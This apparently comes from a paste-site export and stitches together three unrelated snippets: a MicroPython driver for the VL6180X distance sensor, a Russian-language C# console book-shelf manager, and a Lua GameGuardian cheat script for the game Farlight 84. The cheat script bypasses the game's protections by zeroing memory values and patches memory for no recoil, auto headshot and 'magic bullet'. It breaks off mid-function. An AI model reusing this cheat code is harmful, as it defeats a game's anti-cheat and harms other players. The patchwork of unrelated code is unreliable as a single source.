_VL6180X_REG_SYSRANGE_PART_TO_PART_RANGE_OFFSET = const(0x024)

_VL6180X_REG_SYSALS_START = const(0x038)
_VL6180X_REG_SYSALS_ANALOGUE_GAIN = const(0x03F)
_VL6180X_REG_SYSALS_INTEGRATION_PERIOD_HI = const(0x040)
_VL6180X_REG_SYSALS_INTEGRATION_PERIOD_LO = const(0x041)

_VL6180X_REG_RESULT_RANGE_STATUS = const(0x04D)
_VL6180X_REG_RESULT_INTERRUPT_STATUS_GPIO = const(0x04F)
_VL6180X_REG_RESULT_ALS_VAL = const(0x050)
_VL6180X_REG_RESULT_HISTORY_BUFFER_0 = const(0x052)
_VL6180X_REG_RESULT_RANGE_VAL = const(0x062)

# Internal constants:
_VL6180X_DEFAULT_I2C_ADDR = const(0x29)

# User-facing constants:
ALS_GAIN_1 = const(0x06)
ALS_GAIN_1_25 = const(0x05)
ALS_GAIN_1_67 = const(0x04)
ALS_GAIN_2_5 = const(0x03)
ALS_GAIN_5 = const(0x02)
ALS_GAIN_10 = const(0x01)
ALS_GAIN_20 = const(0x00)
ALS_GAIN_40 = const(0x07)

ERROR_NONE = const(0)
ERROR_SYSERR_1 = const(1)
ERROR_SYSERR_5 = const(5)
ERROR_ECEFAIL = const(6)
ERROR_NOCONVERGE = const(7)
ERROR_RANGEIGNORE = const(8)
ERROR_SNR = const(11)
ERROR_RAWUFLOW = const(12)
ERROR_RAWOFLOW = const(13)
ERROR_RANGEUFLOW = const(14)
ERROR_RANGEOFLOW = const(15)


class VL6180X:
    """"""
    Create an instance of the VL6180X distance sensor. You must pass in
    the following parameters:

    :param ~I2C i2c: An instance of the I2C bus connected to the sensor.

    Optionally you can specify:

    :param int address: The I2C address of the sensor.  If not specified the sensor's
                    default value will be assumed.
    :param int offset: The offset to be applied to measurements, in mm
    """"""

    def __init__(
        self, i2c: I2C, address: int = _VL6180X_DEFAULT_I2C_ADDR, offset: int = 0
    ) -> None:
        self._device = i2c
        self._address = address
        if self._read_8(_VL6180X_REG_IDENTIFICATION_MODEL_ID) != 0xB4:
            raise RuntimeError(""Could not find VL6180X, is it connected and powered?"")
        self._load_settings()
        self._write_8(_VL6180X_REG_SYSTEM_FRESH_OUT_OF_RESET, 0x00)
        self.offset = offset

        # Reset a sensor that crashed while in continuous mode
        if self.continuous_mode_enabled:
            self.stop_range_continuous()
            time.sleep(0.1)

        # Activate history buffer for range measurement
        self._write_8(_VL6180X_REG_SYSTEM_HISTORY_CTRL, 0x01)

    @property
    def range(self) -> int:
        """"""
        Read the range of an object in front of sensor and return it in mm.
        """"""
        if self.continuous_mode_enabled:
            return self._read_range_continuous()
        return self._read_range_single()

    @property
    def range_from_history(self) -> Optional[int]:
        """"""
        Read the latest range data from history
        To do so, you don't have to wait for a complete measurement.
        """"""

        if not self.range_history_enabled:
            return None

        return self._read_8(_VL6180X_REG_RESULT_HISTORY_BUFFER_0)

    @property
    def ranges_from_history(self) -> Optional[List[int]]:
        """"""
        Read the last 16 range measurements from history
        """"""

        if not self.range_history_enabled:
            return None

        return [
            self._read_8(_VL6180X_REG_RESULT_HISTORY_BUFFER_0 + age)
            for age in range(16)
        ]

    @property
    def range_history_enabled(self) -> bool:
        """"""
        Checks if history buffer stores range data
        """"""

        history_ctrl: int = self._read_8(_VL6180X_REG_SYSTEM_HISTORY_CTRL)

        if history_ctrl & 0x0:
            print(""History buffering not enabled"")
            return False

        if (history_ctrl > 1) & 0x1:
            print(""History buffer stores ALS data, not range"")
            return False

        return True

    def start_range_continuous(self, period: int = 100) -> None:
        """"""
        Start continuous range mode

        :param int period: Time delay between measurements, in milliseconds; the value you
            will be floored to the nearest 10 milliseconds (setting to 157 ms sets it to 150
            ms). Range is 10 - 2550 ms.
        """"""
        # Set range between measurements
        if not 10 <= period <= 2550:
            raise ValueError(
                ""Delay must be in 10 millisecond increments between 10 and 2550 milliseconds""
            )

        period_reg = (period // 10) - 1
        self._write_8(_VL6180X_REG_SYSRANGE_INTERMEASUREMENT_PERIOD, period_reg)

        # Start continuous range measurement
        self._write_8(_VL6180X_REG_SYSRANGE_START, 0x03)

    def stop_range_continuous(self) -> None:
        """"""
        Stop continuous range mode. It is advised to wait for about 0.3s
        afterwards to avoid issues with the interrupt flags
        """"""
        if self.continuous_mode_enabled:
            self._write_8(_VL6180X_REG_SYSRANGE_START, 0x01)

    @property
    def continuous_mode_enabled(self) -> bool:
        """"""
        Checks if continuous mode is enabled
        """"""
        return self._read_8(_VL6180X_REG_SYSRANGE_START) > 1 & 0x1

    @property
    def offset(self) -> int:
        """"""
        Read and sets the manual offset for the sensor, in millimeters
        """"""
        return self._offset

    @offset.setter
    def offset(self, offset: int) -> None:
        self._write_8(
            _VL6180X_REG_SYSRANGE_PART_TO_PART_RANGE_OFFSET, struct.pack(""b"", offset)[0]
        )
        self._offset = offset

    def _read_range_single(self) -> int:
        """"""
        Read the range when in single-shot mode
        """"""
        while not self._read_8(_VL6180X_REG_RESULT_RANGE_STATUS) & 0x01:
            pass
        self._write_8(_VL6180X_REG_SYSRANGE_START, 0x01)
        return self._read_range_continuous()

    def _read_range_continuous(self) -> int:
        """"""
        Read the range when in continuous mode
        """"""

        # Poll until bit 2 is set
        while not self._read_8(_VL6180X_REG_RESULT_INTERRUPT_STATUS_GPIO) & 0x04:
            pass

        # read range in mm
        range_ = self._read_8(_VL6180X_REG_RESULT_RANGE_VAL)

        # clear interrupt
        self._write_8(_VL6180X_REG_SYSTEM_INTERRUPT_CLEAR, 0x07)

        return range_

    def read_lux(self, gain: int) -> float:
        """"""
        Read the lux (light value) from the sensor and return it.  Must
        specify the gain value to use for the lux reading:

        =================  =====
             Setting       Value
        =================  =====
        ``ALS_GAIN_1``     1x
        ``ALS_GAIN_1_25``  1.25x
        ``ALS_GAIN_1_67``  1.67x
        ``ALS_GAIN_2_5``   2.5x
        ``ALS_GAIN_5``     5x
        ``ALS_GAIN_10``    10x
        ``ALS_GAIN_20``    20x
        ``ALS_GAIN_40``    40x
        =================  =====

        :param int gain: The gain value to use

        """"""
        reg = self._read_8(_VL6180X_REG_SYSTEM_INTERRUPT_CONFIG)
        reg &= ~0x38
        reg |= 0x4 << 3  # IRQ on ALS ready
        self._write_8(_VL6180X_REG_SYSTEM_INTERRUPT_CONFIG, reg)
        # 100 ms integration period
        self._write_8(_VL6180X_REG_SYSALS_INTEGRATION_PERIOD_HI, 0)
        self._write_8(_VL6180X_REG_SYSALS_INTEGRATION_PERIOD_LO, 100)
        # analog gain
        gain = min(gain, ALS_GAIN_40)
        self._write_8(_VL6180X_REG_SYSALS_ANALOGUE_GAIN, 0x40 | gain)
        # start ALS
        self._write_8(_VL6180X_REG_SYSALS_START, 0x1)
        # Poll until ""New Sample Ready threshold event"" is set
        while (
            (self._read_8(_VL6180X_REG_RESULT_INTERRUPT_STATUS_GPIO) >> 3) & 0x7
        ) != 4:
            pass
        # read lux!
        lux = self._read_16(_VL6180X_REG_RESULT_ALS_VAL)
        # clear interrupt
        self._write_8(_VL6180X_REG_SYSTEM_INTERRUPT_CLEAR, 0x07)
        lux *= 0.32  # calibrated count/lux
        if gain == ALS_GAIN_1:
            pass
        elif gain == ALS_GAIN_1_25:
            lux /= 1.25
        elif gain == ALS_GAIN_1_67:
            lux /= 1.67
        elif gain == ALS_GAIN_2_5:
            lux /= 2.5
        elif gain == ALS_GAIN_5:
            lux /= 5
        elif gain == ALS_GAIN_10:
            lux /= 10
        elif gain == ALS_GAIN_20:
            lux /= 20
        elif gain == ALS_GAIN_40:
            lux /= 40
        lux *= 100
        lux /= 100  # integration time in ms
        return lux

    @property
    def range_status(self) -> int:
        """"""
        Retrieve the status/error from a previous range read.  This will
        return a constant value such as:

        =====================  ==============================
                Error                   Description
        =====================  ==============================
        ``ERROR_NONE``         No error
        ``ERROR_SYSERR_1``     System error 1 (see datasheet)
        ``ERROR_SYSERR_5``     System error 5 (see datasheet)
        ``ERROR_ECEFAIL``      ECE failure
        ``ERROR_NOCONVERGE``   No convergence
        ``ERROR_RANGEIGNORE``  Outside range ignored
        ``ERROR_SNR``          Too much noise
        ``ERROR_RAWUFLOW``     Raw value underflow
        ``ERROR_RAWOFLOW``     Raw value overflow
        ``ERROR_RANGEUFLOW``   Range underflow
        ``ERROR_RANGEOFLOW``   Range overflow
        =====================  ==============================

        """"""
        return self._read_8(_VL6180X_REG_RESULT_RANGE_STATUS) >> 4

    def _load_settings(self) -> None:
        """"""
        private settings from page 24 of app note
        """"""
        self._write_8(0x0207, 0x01)
        self._write_8(0x0208, 0x01)
        self._write_8(0x0096, 0x00)
        self._write_8(0x0097, 0xFD)
        self._write_8(0x00E3, 0x00)
        self._write_8(0x00E4, 0x04)
        self._write_8(0x00E5, 0x02)
        self._write_8(0x00E6, 0x01)
        self._write_8(0x00E7, 0x03)
        self._write_8(0x00F5, 0x02)
        self._write_8(0x00D9, 0x05)
        self._write_8(0x00DB, 0xCE)
        self._write_8(0x00DC, 0x03)
        self._write_8(0x00DD, 0xF8)
        self._write_8(0x009F, 0x00)
        self._write_8(0x00A3, 0x3C)
        self._write_8(0x00B7, 0x00)
        self._write_8(0x00BB, 0x3C)
        self._write_8(0x00B2, 0x09)
        self._write_8(0x00CA, 0x09)
        self._write_8(0x0198, 0x01)
        self._write_8(0x01B0, 0x17)
        self._write_8(0x01AD, 0x00)
        self._write_8(0x00FF, 0x05)
        self._write_8(0x0100, 0x05)
        self._write_8(0x0199, 0x05)
        self._write_8(0x01A6, 0x1B)
        self._write_8(0x01AC, 0x3E)
        self._write_8(0x01A7, 0x1F)
        self._write_8(0x0030, 0x00)
        # Recommended : Public registers - See data sheet for more detail
        self._write_8(0x0011, 0x10)  # Enables polling for 'New Sample ready'
        # when measurement completes
        self._write_8(0x010A, 0x30)  # Set the averaging sample period
        # (compromise between lower noise and
        # increased execution time)
        self._write_8(0x003F, 0x46)  # Sets the light and dark gain (upper
        # nibble). Dark gain should not be
        # changed.
        self._write_8(0x0031, 0xFF)  # sets the # of range measurements after
        # which auto calibration of system is
        # performed
        self._write_8(0x0040, 0x63)  # Set ALS integration time to 100ms
        self._write_8(0x002E, 0x01)  # perform a single temperature calibration
        # of the ranging sensor

        # Optional: Public registers - See data sheet for more detail
        self._write_8(0x001B, 0x09)  # Set default ranging inter-measurement
        # period to 100ms
        self._write_8(0x003E, 0x31)  # Set default ALS inter-measurement period
        # to 500ms
        self._write_8(0x0014, 0x24)  # Configures interrupt on 'New Sample
        # Ready threshold event'
    
    def _write_register(self, register: int) -> None:
        """"""
        Write 0 byte of data from the specified 16-bit register address.
        """"""
        self._device.writeto(
            self._address,
            struct.pack("">H"", register),
        )

    def _write_8(self, register: int, data: int) -> None:
        """"""
        Write 1 byte of data from the specified 16-bit register address.
        """"""
        self._device.writeto(
            self._address,
            struct.pack("">HB"", register, data),
        )

    def _write_16(self, register: int, data: int) -> None:
        """"""
        Write a 16-bit big endian value to the specified 16-bit register
        address.
        """"""
        self._device.writeto(
            self._address,
            struct.pack("">HH"", register, data),
        )

    def _read_8(self, register: int) -> int:
        """"""
        Read and return a byte from the specified 16-bit register address.    
        """"""
        result = bytearray(1)
        self._write_register(register)
        self._device.readfrom_into(self._address, result)
        return result[0]

    def _read_16(self, register: int) -> int:
        """"""
        Read and return a 16-bit unsigned big endian value read from the
        specified 16-bit register address.
        """"""
        result = bytearray(2)
        self._write_register(register)
        self._device.readfrom_into(self._address, result)
        return struct.unpack_from("">H"", result)[0]


if __name__ == ""__main__"":
    from machine import I2C, Pin, PWM
    
    led = PWM(Pin(13), duty_u16=0, freq=300)
    
    
    i2c = I2C(0, freq=400_000)
    sensor = VL6180X(i2c)
    # sensor.offset = 20
    sensor.start_range_continuous(50)
    while True:
        if (srange := sensor.range) != 255:
            led.duty_u16(int((255 - srange) * 65535 / 255))
            # time.sleep_ms(500)
            print(srange, ""mm"")
        else:
            led.duty_u16(0)

"
wd096RJE,DZ_Library2,MayloGreen,C#,Tuesday 4th of July 2023 06:18:07 AM CDT,"using System;
using System.Collections.Generic;

namespace DZ_Library
{
    class Program
    {
        public static void Main(string[] args)
        {
            const string AddBookCommand = ""1"";
            const string DeleteBookCommand = ""2"";
            const string ShowBooksCommand = ""3"";
            const string ShowBookByNameCommand = ""4"";
            const string ShowBookByAuthorCommand = ""5"";
            const string ShowBookByPublisherCommand = ""6"";
            const string ShowBookByReleaseYearCommand = ""7"";
            const string ExitProgrammCommand = ""8"";

            bool itProgramWork = true;

            Shelf shelf = new Shelf();

            Console.WriteLine(""Управление библиотекой"");
            Console.WriteLine($""{AddBookCommand}) Добавить книгу\n{DeleteBookCommand}) Удалить книгу\n{ShowBooksCommand}) Показать все книги на книжной полке\n{ShowBookByNameCommand}) Показать книги по названию\n{ShowBookByAuthorCommand}) Показать книги по имени автора\n{ShowBookByPublisherCommand}) Показать книги по названию издателя\n{ShowBookByReleaseYearCommand}) Показать книги по году издания\n{ExitProgrammCommand}) Выход из программы"");

            while (itProgramWork)
            {
                Console.Write(""Введите номер команды: "");
                string switchOn = Console.ReadLine();

                switch (switchOn)
                {
                    case AddBookCommand:
                        shelf.AddNewBook();
                        break;

                    case DeleteBookCommand:
                        shelf.DeleteBook();
                        break;

                    case ShowBooksCommand:
                        shelf.ShowBooks();
                        break;

                    case ShowBookByNameCommand:
                        shelf.ShowBooksByName();
                        break;

                    case ShowBookByAuthorCommand:
                        shelf.ShowBookByAuthor();
                        break;

                    case ShowBookByPublisherCommand:
                        shelf.ShowBookByPublisher();
                        break;

                    case ShowBookByReleaseYearCommand:
                        shelf.ShowBookByReleaseYear();
                        break;

                    case ExitProgrammCommand:
                        itProgramWork = false;
                        break;
                }
            }
        }
    }

    class Book
    {
        public Book(string name, string author, string publisher, int releaseYear)
        {
            Name = name;
            Author = author;
            Publisher = publisher;
            ReleaseYear = releaseYear;
        }

        public string Name { get; }

        public string Author { get; }

        public string Publisher { get; }

        public int ReleaseYear { get; }

        public void Show()
        {
            Console.WriteLine($""Название книги: {Name}, Автор книги: {Author}, Издатель: {Publisher}, Год выпуска: {ReleaseYear}"");
        }
    }

    class Shelf
    {
        private BooksGenerator _booksGenerator = new BooksGenerator();

        private List<Book> _books;

        public Shelf()
        {
            _books = _booksGenerator.CreateShelf();
        }

        public void AddNewBook()
        {
            int number;

            Console.Write(""\nВведите название книги: "");
            string bookName = Console.ReadLine();

            Console.Write(""Введите имя автора книги: "");
            string bookAuthor = Console.ReadLine(); ;

            Console.Write(""Введите название издателя книги: "");
            string bookPublisher = Console.ReadLine(); ;

            Console.Write(""Введите год издания книги: "");
            string bookReleaseYear = Console.ReadLine();

            bool result = int.TryParse(bookReleaseYear, out number);

            if (result)
            {
                _books.Add(new Book(bookName, bookAuthor, bookPublisher, number));
                Console.WriteLine();
            }
            else
            {
                Console.WriteLine(""\nНе допустимый символ в поле \""год издания!!!\"""");
            } 
        }

        public void DeleteBook()
        {
            int number;

            Console.WriteLine();

            ShowBooks();

            Console.Write(""\nУкажите номер книги которую вы хотите удалить: "");
            string indexBook = Console.ReadLine();

            bool result = int.TryParse(indexBook, out number);

            if (result)
            {
                _books.RemoveAt(number - 1);
                Console.WriteLine();
            }
            else
            {
                Console.WriteLine(""\nНеобходимо ввести номер книги которую хотите удалить!!!"");
            }
        }

        public void ShowBooks()
        {
            Console.WriteLine();
            for (int i = 0; i < _books.Count; i++)
            {
                Console.Write(i + 1 + "") "");

                _books[i].Show();
            }
            Console.WriteLine();
        }

        public void ShowBooksByName()
        {
            Console.Write(""\nВведите название книги: "");
            string nameBook = Console.ReadLine();

            for (int i = 0; i < _books.Count; i++)
            {
                if (nameBook.ToLower() == _books[i].Name.ToLower())
                {
                    Console.Write(i + 1 + "") "");

                    _books[i].Show();
                }
            }

            Console.WriteLine();
        }

        public void ShowBookByAuthor()
        {
            Console.Write(""\nВведите автора книги: "");
            string authorBook = Console.ReadLine();

            for (int i = 0; i < _books.Count; i++)
            {
                if (authorBook.ToLower() == _books[i].Author.ToLower())
                {
                    Console.Write(i + 1 + "") "");

                    _books[i].Show();
                }
            }

            Console.WriteLine();
        }

        public void ShowBookByPublisher()
        {
            Console.Write(""\nВведите издателя книги: "");
            string publisherBook = Console.ReadLine();

            for (int i = 0; i < _books.Count; i++)
            {
                if (publisherBook.ToLower() == _books[i].Publisher.ToLower())
                {
                    Console.Write(i + 1 + "") "");

                    _books[i].Show();
                }
            }

            Console.WriteLine();
        }

        public void ShowBookByReleaseYear()
        {
            int number;

            Console.Write(""\nВведите год издания книги: "");
            string releaseYearBook = Console.ReadLine();
            Console.WriteLine();

            for (int i = 0; i < _books.Count; i++)
            {
                bool result = int.TryParse(releaseYearBook, out number);
                if (result)
                {
                    if (_books[i].ReleaseYear == number)
                    {
                        Console.Write(i + 1 + "") "");

                        _books[i].Show();
                    }
                }
                else
                {
                    Console.WriteLine(""\nВведите год издания!!!"");
                }
            }

            Console.WriteLine();
        }
    }

    class BooksGenerator
    {
        public List<Book> CreateShelf()
        {
            List<Book> books = new List<Book>();

            books.Add(new Book(""Война и Мир"", ""Л.Н. Толстой"", ""Астриель"", 1887));
            books.Add(new Book(""Анна Каренина"", ""Л.Н. Толстой"", ""Астриель"", 1888));
            books.Add(new Book(""Два старика"", ""Л.Н. Толстой"", ""Астриель"", 1889));
            books.Add(new Book(""Три старца"", ""Л.Н. Толстой"", ""Астриель"", 1890));

            return books;
        }
    }
}"
CazcW156,سكريبت القناه,Maqtada11bb,Lua,Tuesday 4th of July 2023 06:15:52 AM CDT," print(""password 🚫 "") 
 PASSW = gg.prompt({""🔒 Key GG : ""},{[1]=""""},{[1]=""text""})
 if not PASSW the﻿n return end
 if PASSW[1] == """" then gg.alert(""Pass Login "") end
 if PASSW[1] == ""Alvan@ESPSMG1"" then gg.toast(""Alvan Done pas"") else gg.toast(""عليك الاشتراك والحصول على مفتاح الخاص بك"") return end


 print(""BY OMG_MH"") if os.date(""%Y%m%d"") >= ""20230705"" then print(""VIP GG"") return gg.alert("" alvan mod "")end

function WriteBaseAddress_DWORD(Lib, Offset, Edit)
    local Ranges = gg.getRangesList(Lib)
    if Ranges and #Ranges > 0 then
        local v = {}
        v[1] = {}
        v[1].address = Ranges[1].start + Offset
        v[1].value = Edit
        v[1].flags = 4
        v[1].freeze = true
        gg.setValues(v)
    end
end

gg.setVisible(false)
gg.sleep(250)
gg.toast(""□□□□□0%❤️  "")
gg.sleep(350)
gg.toast(""■□□□□20%💙 "")
gg.sleep(375)
gg.toast(""■■□□□40%🤍 "")
gg.sleep(350)
gg.toast(""■■■□□60%💛 "")
gg.sleep(325)
gg.toast(""■■■■□80%💚 "")
gg.sleep(335)
gg.toast(""■■■■■100% 💜"")
gg.sleep(300)
info = gg.alert(""Alvan hack Telegram @ESPSMG1 "",""ALVAN"",""HACK"")
gg.alert(""FARLIGHT 84 ViP GG سكربت فارلايت "")
function HOME()
menu = gg.multiChoice({
   ""  لاصلاح الكراش والحمايه- FIX CRASH + bypass  ✨"",
   ""ثبات سلاح - No Recoil ✨"",
   ""منظور ايباد - iPad perspective✨ "",
   ""سماء سوداء. - BlskSky ✨"",
   ""ماجك بولت قوي - ᴍᴀɢɪᴄ ʜᴇᴀᴅ Full ✨"",
   ""ضربه اكس - HITBOX✨"",
   ""وضع ليلي - NightMode✨"",
   ""هيدشوت - AutoHead ✨"",
""خروج/Exit"",
	 }, nil, ""GG  VIP ALVAN HACK"")
if menu == nil then else
if menu[1] == true then F1() end
if menu[2] == true then F2() end
if menu[3] == true then F3() end
if menu[4] == true then F4() end
if menu[5] == true then F5() end
if menu[6] == true then F6() end
if menu[7] == true then F7() end
if menu[8] == true then F8() end
if menu[9] == true then Exit() end
end 
  PUBGMH = -1
end


function F1()
gg.alert(""FARLIGHT 84 Hack Alvan @ESPSMG1 "")
menuAntena = gg[""choice""]({
    ""[ Fix crash  ]"",
    ""[ Bypass Logo ] "",
    ""[ Bypass Lobby ] "",
  }, 2023, ""Bypass VIP "")
  if menuAntena == 2023 then
  else
    if menuAntena == 1 then
      F8_1()
    end
    if menuAntena == 2 then
      F8_2()
    if menuAntena == 3 then
      F8_3()
    end
   end
  end
end

function F8_1()
gg.clearResults()
gg.searchNumber("":vap"", gg.TYPE_BYTE, false, gg.SIGN_EQUAL, 0, -1, 0)
revert = gg.getResults(2000, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""h00207047"", gg.TYPE_BYTE)
gg.clearResults()
gg.alert(""ᴀɴᴛɪ ᴄʀᴀꜱʜ ᴅᴏɴᴇ"")
end

function F8_2()
gg.clearResults()
gg.setRanges(gg.REGION_CODE_APP)
gg.searchNumber(""1668113773"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
gg.refineNumber(""1668113773"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
revert = gg.getResults(100, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""0"", gg.TYPE_DWORD)

gg.clearResults()
gg.searchNumber(""1828747632"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
gg.refineNumber(""1828747632"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
revert = gg.getResults(100, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""0"", gg.TYPE_DWORD)

gg.clearResults()
gg.searchNumber(""1702063461"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
gg.refineNumber(""1702063461"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
revert = gg.getResults(100, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""0"", gg.TYPE_DWORD)

gg.clearResults()
gg.searchNumber(""1296498804"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
gg.refineNumber(""1296498804"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
revert = gg.getResults(100, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""0"", gg.TYPE_DWORD)

gg.clearResults()
gg.searchNumber(""1735352133"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
gg.refineNumber(""1735352133"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
revert = gg.getResults(100, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""0"", gg.TYPE_DWORD)

gg.clearResults()
gg.searchNumber(""1701076839"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
gg.refineNumber(""1701076839"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
revert = gg.getResults(100, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""0"", gg.TYPE_DWORD)

gg.clearResults()
gg.searchNumber(""1818451811"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
gg.refineNumber(""1818451811"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
revert = gg.getResults(100, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""0"", gg.TYPE_DWORD)

gg.clearResults()
gg.searchNumber(""6648687"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
gg.refineNumber(""6648687"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
revert = gg.getResults(100, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""0"", gg.TYPE_DWORD)

gg.clearResults()
gg.searchNumber(""1191208292"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
gg.refineNumber(""1191208292"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
revert = gg.getResults(100, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""0"", gg.TYPE_DWORD)

gg.clearResults()
gg.searchNumber(""1683973991"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
gg.refineNumber(""1683973991"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
revert = gg.getResults(100, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""0"", gg.TYPE_DWORD)

gg.clearResults()
gg.searchNumber(""1734304613"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
gg.refineNumber(""1734304613"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
revert = gg.getResults(100, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""0"", gg.TYPE_DWORD)

gg.clearResults()
gg.searchNumber(""1667200101"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
gg.refineNumber(""1667200101"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
revert = gg.getResults(100, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""0"", gg.TYPE_DWORD)

gg.clearResults()
gg.searchNumber(""1701999221"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
gg.refineNumber(""1701999221"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
revert = gg.getResults(100, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""0"", gg.TYPE_DWORD)

gg.clearResults()
gg.searchNumber(""1935635566"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
gg.refineNumber(""1935635566"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
revert = gg.getResults(100, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""0"", gg.TYPE_DWORD)
gg.clearResults()
gg.searchNumber(""1819307361"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
gg.refineNumber(""1819307361"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
revert = gg.getResults(100, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""0"", gg.TYPE_DWORD)
gg.clearResults()
gg.searchNumber(""1296498789"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
gg.refineNumber(""1296498789"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
revert = gg.getResults(100, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""0"", gg.TYPE_DWORD)
gg.clearResults()
gg.getResults(5000)
gg.setVisible(false)
gg.getResults(10000)
gg.getResults(10000)
gg.clearResults()
gg.setVisible(false)
gg.toast(""DONE....✅"")
end


function F8_3()
gg.setRanges(gg.REGION_BAD)
gg.searchNumber(""1178944583;1681196032;1380013640;1623918080;1610612736;1413567571;1000000000~2000000000::10982"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1, 0)
revert = gg.getResults(10000, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""0"", gg.TYPE_DWORD)
gg.clearResults()
gg.toast(""DONE....✅"")
end


function F2()
gg.alert(""جاري تفعيل ثبات سلاح"")
gg.setRanges(gg.REGION_ANONYMOUS)
gg.searchNumber(""2~3;100;0.01999999933~0.9;0.10000000298~0.9;0.01600000292~0.09600000292:85"",gg.POINTER_WRITABLE,false,gg.SIGN_EQUAL,0,-1,0)gg.getResults(""99999"")
gg.editAll(""0"",gg.POINTER_WRITABLE)gg.clearList()
gg.toast("" ɴᴏ ʀᴇʟᴏᴀᴅ ᴀᴄᴛɪᴠᴀᴛᴇᴅ ✅"")

end

function F3()
gg.alert(""جاري تفعيل منظور ايباد "")
gg.setRanges(gg.REGION_CODE_APP)
gg.searchNumber(""0.001000000005F;3.14159274101F; 360.0F:13"",gg.POINTER_WRITABLE)gg.getResults(""9999"")
gg.editAll(""250"",gg.POINTER_WRITABLE)-- [𝐋𝐨𝐠-𝐇𝐨𝐨𝐤] 𝐁𝐲 𝐎𝐧𝐥𝐲𝐓𝐫𝐢𝐬
gg.setRanges(gg.REGION_CODE_APP)
gg.toast(""ʜɪɢʜ ғᴏᴠ ᴀᴄᴛɪᴠᴀᴛᴇᴅ✅"")


end


function F4()
gg.setRanges(gg.REGION_VIDEO)
gg.searchNumber(""2.0;3.0;0.00100000005:9"",gg.POINTER_WRITABLE,false,gg.SIGN_EQUAL,0,-1,0)gg.getResults(""271"")
gg.editAll(""9999"",gg.POINTER_WRITABLE)gg.clearList()
gg.toast(""ᴅᴀʀᴋsᴋʏ ᴀᴄᴛɪᴠᴀᴛᴇᴅ"")
gg.alert(""تم تفعيل سماء سوداء✅"")
end


function F5()
gg.alert(""FARLIGHT 84 Hack Alvan @ESPSMG1 "")
menuAntena = gg[""choice""]({
    ""[ Magic Bullet V1🔥]"",
    ""[ Magic Bullet V2🔥] "",
    ""[ Magic Bullet V3🔥] "",
  }, 2023, ""استخدم الذي يعمل مع جهازك \nملاحظه اكو كراش بل ماجك قم بتجربتهن والذي يعمل معك استخدمه "")
  if menuAntena == 2023 then
  else
    if menuAntena == 1 then
      MG1()
    end
    if menuAntena == 2 then
      MG2()
    if menuAntena == 3 then
      MG3()
    end
   end
  end
end

function MG1()
gg.setVisible(false)
gg.searchNumber(""4,557,642,823,998,111,744"", gg.TYPE_QWORD)
gg.getResults(9999)
gg.editAll(""4557642824019345408"", gg.TYPE_QWORD)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""6.875"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""6.1875"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""6.75"", gg.TYPE_FLOAT)
gg.getResults(9999)
